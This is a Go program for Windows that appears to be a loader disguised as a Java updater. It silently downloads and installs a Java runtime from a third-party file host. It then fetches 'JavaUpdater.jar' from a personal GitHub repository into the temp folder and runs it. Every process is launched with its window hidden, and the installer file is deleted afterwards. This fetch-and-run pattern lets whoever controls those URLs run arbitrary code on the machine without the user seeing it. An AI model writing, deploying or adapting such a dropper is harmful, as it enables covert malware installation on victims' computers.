package main

import (
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"syscall"
)

func isJavaInstalled() bool {
	cmd := exec.Command("java", "-version")
	cmd.Stderr = cmd.Stdout
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	err := cmd.Run()
	return err == nil
}

func getJavaPath() string {
	cmd := exec.Command("where", "java")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	output, err := cmd.Output()
	if err != nil {
		return ""
	}

	match := regexp.MustCompile(`(.*)\\java.exe`).FindStringSubmatch(string(output))
	if len(match) > 1 {
		return match[1]
	}
	return ""
}

func download(url, localFilename string) error {
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	out, err := os.Create(localFilename)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, resp.Body)
	return err
}

func installJavaSilently(installerPath string) error {
	cmd := exec.Command(installerPath, "/s")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	return cmd.Run()
}

func runUpdater(updaterPath, javaPath string) error {
	cmd := exec.Command(filepath.Join(javaPath, "javaw.exe"), "-jar", updaterPath)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	return cmd.Run()
}

func delete(installerPath string) {
	os.Remove(installerPath)
}

func main() {
	tempDir := os.TempDir()

	if !isJavaInstalled() {
		javaURL := "https://files01.tchspt.com/temp/jre-8u371-windows-x64.exe"
		localFilename := filepath.Join(tempDir, "jre-8u371-windows-x64.exe")
		err := download(javaURL, localFilename)
		if err != nil {
			fmt.Println("Error downloading Java:", err)
			return
		}
		installJavaSilently(localFilename)
		delete(localFilename)
	} else {
		fmt.Println("Java is already installed.")
	}

	javaPath := getJavaPath()

	if javaPath == "" {
		fmt.Println("Java path not found.")
	} else {
		updaterURL := "https://raw.githubusercontent.com/dolmety/storage/main/JavaUpdater.jar"
		updaterPath := filepath.Join(tempDir, "JavaUpdater.jar")
		err := download(updaterURL, updaterPath)
		if err != nil {
			fmt.Println("Error downloading updater:", err)
			return
		}
		runUpdater(updaterPath, javaPath)
	}
}